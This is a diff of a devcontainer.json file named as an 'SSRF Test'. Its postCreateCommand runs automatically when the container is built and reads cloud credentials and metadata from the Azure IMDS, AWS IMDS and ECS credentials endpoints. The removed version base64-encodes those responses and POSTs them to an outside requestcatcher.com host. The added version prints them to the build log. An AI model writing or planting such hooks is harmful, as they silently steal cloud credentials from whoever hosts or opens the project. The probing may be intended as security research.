@@ -1,8 +1,8 @@
 {
-  "name": "SSRF Test Azure IMDS",
+  "name": "SSRF Test - Log IMDS Direct",
   "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
   "features": {
     "ghcr.io/devcontainers/features/common-utils:2": {}
   },
-  "postCreateCommand": "IMDS_RAW=$(curl -s -w '\\n---HTTP_CODE:%{http_code}---' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' -H 'Metadata: true' 2>&1); curl -X POST -d \"azure_imds=$(echo $IMDS_RAW | base64 -w0)\" https://ssrf-exfil.requestcatcher.com/azure-imds; AWS_IMDS=$(curl -s http://169.254.169.254/latest/meta-data/ 2>&1); curl -X POST -d \"aws_imds=$(echo $AWS_IMDS | base64 -w0)\" https://ssrf-exfil.requestcatcher.com/aws-imds; ECS_CREDS=$(curl -s http://169.254.170.2/v2/credentials 2>&1); curl -X POST -d \"ecs=$(echo $ECS_CREDS | base64 -w0)\" https://ssrf-exfil.requestcatcher.com/ecs-creds"
+  "postCreateCommand": "echo '=== AZURE IMDS ===' && curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>&1 && echo '' && echo '=== AWS IMDS ===' && curl -s http://169.254.169.254/latest/meta-data/ 2>&1 && echo '' && echo '=== ECS CREDS ===' && curl -s http://169.254.170.2/v2/credentials 2>&1 && echo '=== DONE ==='"
 }
